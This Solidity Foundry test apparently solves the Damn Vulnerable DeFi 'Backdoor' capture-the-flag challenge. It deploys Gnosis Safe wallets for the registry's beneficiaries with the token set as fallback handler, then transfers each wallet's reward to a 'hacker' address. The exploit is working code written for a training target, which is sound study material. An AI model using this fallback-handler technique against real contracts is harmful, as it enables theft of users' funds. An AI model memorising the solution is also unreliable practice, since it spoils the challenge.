// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/DamnValuableToken.sol";

import {WalletRegistry} from "src/Backdoor/WalletRegistry.sol";
import {Safe} from "@gnosis.pm/safe-contracts/contracts/Safe.sol";
import {SafeProxyFactory} from "@gnosis.pm/safe-contracts/contracts/proxies/SafeProxyFactory.sol";
import {SafeProxy} from "@gnosis.pm/safe-contracts/contracts/proxies/SafeProxy.sol";

// Challenge #11 - Backdoor
// https://www.damnvulnerabledefi.xyz/challenges/backdoor/

contract Attack is Test {
    DamnValuableToken public token;
    Safe internal masterCopy;
    SafeProxyFactory internal walletFactory;
    WalletRegistry internal walletRegistry;

    address public constant ALICE = payable(address(uint160(uint256(keccak256(abi.encodePacked("alice"))))));
    address public constant BOB = payable(address(uint160(uint256(keccak256(abi.encodePacked("bob"))))));
    address public constant CHARLIE = payable(address(uint160(uint256(keccak256(abi.encodePacked("charlie"))))));
    address public constant DAVID = payable(address(uint160(uint256(keccak256(abi.encodePacked("david"))))));
    address[] public users = [ALICE, BOB, CHARLIE, DAVID];
    address public hacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("hacker"))))));

    uint256 public constant AMOUNT_TOKENS_DISTRIBUTED = 40 * 1e18;
    uint256 public constant AMOUNT_TOKENS_DISTRIBUTED_PER_WALLET = 10 * 1e18;

    function setUp() public {
        token = new DamnValuableToken();
        masterCopy = new Safe();
        walletFactory = new SafeProxyFactory();
        walletRegistry = new WalletRegistry(address(masterCopy), address(walletFactory), address(token), users);
        assertEq(walletRegistry.owner(), address(this));

        for (uint256 i = 0; i < users.length; i++) {
            // Users are registered as beneficiaries
            assertEq(walletRegistry.beneficiaries(users[i]), true);

            vm.startPrank(users[i]);
            vm.expectRevert(bytes("Ownable: caller is not the owner"));
            walletRegistry.addBeneficiary(users[i]);
            vm.stopPrank();
        }

        token.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);
    }

    function testExploit() public {
        // Attack Code:
        vm.startPrank(hacker);

        for (uint256 i = 0; i < users.length; i++) {
            address[] memory walletOwners = new address[](1);
            walletOwners[0] = users[i];

            bytes memory initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                walletOwners, // _owners
                1, // _threshold
                address(0), // to
                "", // data
                address(token), // fallbackHandler
                address(0), // paymentToken
                0, // payment
                address(0) // paymentReceiver
            );

            SafeProxy proxy = walletFactory.createProxyWithCallback(address(masterCopy), initializer, 1, walletRegistry);

            (bool success,) = address(proxy).call(
                abi.encodeWithSignature("transfer(address,uint256)", hacker, AMOUNT_TOKENS_DISTRIBUTED_PER_WALLET)
            );
        }

        vm.stopPrank();

        // ------ Test ------

        // assertEq(vm.getNonce(hacker), 1);

        for (uint256 i = 0; i < users.length; i++) {
            address wallet = walletRegistry.wallets(users[i]);

            // User must have registered a wallet
            assertFalse(wallet == address(0), "User did not register a wallet");

            // User is no longer registered as a beneficiary
            assertEq(walletRegistry.beneficiaries(users[i]), false);
        }

        // Hacker must own all tokens
        assertEq(token.balanceOf(hacker), AMOUNT_TOKENS_DISTRIBUTED);
    }
}
